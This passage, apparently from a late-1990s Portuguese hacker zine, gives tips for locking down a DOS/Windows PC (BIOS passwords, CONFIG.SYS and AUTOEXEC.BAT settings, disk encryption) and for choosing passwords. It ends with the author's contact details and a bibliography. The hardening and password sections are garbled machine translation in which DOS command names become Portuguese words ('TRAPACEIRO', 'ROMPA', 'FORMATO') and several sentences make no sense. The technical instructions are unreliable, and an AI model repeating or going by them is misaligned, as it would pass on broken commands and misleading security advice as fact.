		b. Tenha certeza que a contra-senha é o máximo possível 
			número de caráter apoiado pelo BIOS. 
	2. Incapacite disquete que calça as botas em o BIOS de dentro 
	3. Incapacite Estrada de contorno de arquivos de startup 
		um. Isto é acabado somando a linha: 
			SWITCHES=/F /N 
		   para o arquivo de CONFIG.SYS. 
		b. Adicionalmente, você poderia querer preceder 
			todas as declarações no Autoexec.bat 
			com CTTY NUL, e então tem o TRAPACEIRO de CTTY 
			como a última linha. Isto previne quebrando 
			fora de autoexec.bat 
		c. Se você usa compressão de DriveSpace, some o 
			linha seguinte para seu arquivo de DRVSPACE.INI: 
			SWITCHES=/F /N 
		d. Some a linha: 
			ROMPA 
		   Isto reduz o número de chances para o que você tem 
		   fuja de AUTOEXEC.BAT, tudo entretanto não faz 
		   apague completamente 
	4. Monte uma Segurança DOS-baseada TSR 
		um. Tenha certeza você não pode ter acesso o passeio mole 
			sem uma contra-senha, e que permite 
			para escrever-proteção. 
		b. Tenha certeza permite proteção de contra-senha. 
	5. Monte um programa de Segurança Windows-baseado 
		um. Tenha certeza você pode controlar quais características de 
			Windows você pode limitar ou pode incapacitar. 
		b. Tenha certeza permite proteção de contra-senha. 
	6. Instale um programa de filesystem codificado. (i.e., CryptDisk) 
		um. Isto prevenirá acesso para o computador e 
			arquivos no disco rígido a menos que a contra-senha 
			é entrado. Fará seus dados  
			unaccessible igualam se o disco rígido é  
			extraído do sistema. 
	7. Apague os arquivos seguintes: 
		FORMATO 
		DELTREE 
		SUBST 
		UNA 
		AUXILIO 
		RESTABELEÇA 
		ATTRIB 


Contra-senhas 
== == == == = 
Contra-senhas geralmente são o vínculo mais fraco na cadeia de segurança. 
Quando escolhendo uma contra-senha, se lembre destas gorjetas: 

Não escolha algo óbvio. Jure palavras, seu birthdate, 
tópicos que pertencem ao que você faz and/or seus interesses são é 
exemplos de contra-senhas RUINS. 

Uma Contra-senha Boa é um que é totalmente fortuito. Escolher uma contra-senha, 
tente isto: Agarre um dicionário. Feche seus olhos, e sacuda um  
página fortuita. Com seus olhos ainda fechados, vista seu dedo um  
mancha fortuita nesta página. Se lembre da palavra, e faça isto novamente.  
Combine as duas palavras, e junte um número de três-dígito para o fim.  
Você também poderia querer entremear caráter non-alfanuméricos  
na contra-senha de modos fortuitos, como uma colisão estranha ou  
apóstrofe aqui e lá. 

Também, NUNCA escreva sua contra-senha abaixo. Sempre mantenha em sua cabeça. 
Um simples Posto-isto nota em seu monitor pode derrubar todos o 
segurança para cima a que você fixou tão meticulosamente! 

Uma contra-senha boa couros de sistemas as contra-senhas de todo o mundo,  
inclusive os administradores de sistemas. Isto significa que o sys  
admins não podem contar se os usuários estão pondo em contra-senhas fracas. 

Uma nota final: Quando projetando um sistema de segurança, esteja seguro levar 
o usuário em conta. Se um sistema é de tal segurança de alto-grau 
que é um nuisance para usar, as pessoas sempre acharão o preguiçoso  
modo para fazer isto. (Nota...) 

---------------------------------------------------------------- 

Como entrar em contato

	Chegamos ao fim da versão beta deste zine, eu gostaria de contar com a participação de vocês, sejam crackers, phreakers, hackers ou até mesmo lammers esforçados. Para mandar dicas mande um e-mail para mim com o subject dicas_zine. Não farei assinaturas, porque como já tinha dito estou sem tempo. Mas você encontrará facilmente o número atualizado do zine em minha HP, mesmo que a geocities me dê um take down e a colocarei no ar de novo, em outro endereço, mas colocarei. Para contatos, dicas e outras coisas aí vai meu E-mail:

E-mail: dark_sided@geocities.com
Home Page: http://www.geocities.com/siliconvalley/peaks/2667/index.html 
(grande não ?)

Há, como eu já ia me esquecendo, me perdoem qualquer erro de protuguês. A bibliografia está ai embaixo.

Zine nethack
Manual definitivo de violação a telefones públicos e privados
Pc-FAQ

Nós somos o poder,
não poder sem conhecimento.

Cyber Cool.




















	











